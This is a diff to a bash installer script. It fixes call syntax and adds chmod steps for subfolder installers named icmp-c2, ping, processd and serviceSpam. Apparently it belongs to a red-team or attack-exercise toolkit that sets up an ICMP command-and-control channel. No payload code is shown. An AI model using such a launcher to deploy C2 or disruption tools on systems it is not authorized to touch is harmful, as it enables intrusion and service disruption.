@@ -2,7 +2,7 @@
 WHICH="$1"
 ROOT_PATH="$(dirname $( realpath "$0"  ))"
 
-echo "Dirname: $DIRNAME"
+echo "Dirname: $ROOT_PATH"
 echo "Which: $WHICH"
 
 
@@ -13,16 +13,19 @@ echo "Which: $WHICH"
 
 icmpC2 () {
     cd "$ROOT_PATH/icmp-c2"
+    chmod +x ./install.sh
     ./install.sh
 }
 
-ping () {
+ping_install () {
     cd "$ROOT_PATH/ping"
+    chmod +x ./install.sh
     ./install.sh
 }
 
 processd () {
     cd "$ROOT_PATH/processd"
+    chmod +x ./install.sh
     ./install.sh
 }
 
@@ -36,20 +39,20 @@ if [[ "$WHICH" == "all" ]]; then
     # Currently debugging installer script
     # cd http-takedown
     # install
-    icmpC2()
-    ping()
-    processd()
-    serviceSpam()
+    icmpC2
+    ping_install
+    processd
+    serviceSpam
 fi
 if [[ "$WHICH" == "icmp" ]]; then
-    icmpC2()
+    icmpC2
 fi
 if [[ "$WHICH" == "ping" ]]; then
-    ping()
+    ping_install
 fi
 if [[ "$WHICH" == "processd" ]]; then
-    processd()
+    processd
 fi
 if [[ "$WHICH" == "services" ]]; then
-    serviceSpam()
+    serviceSpam
 fi
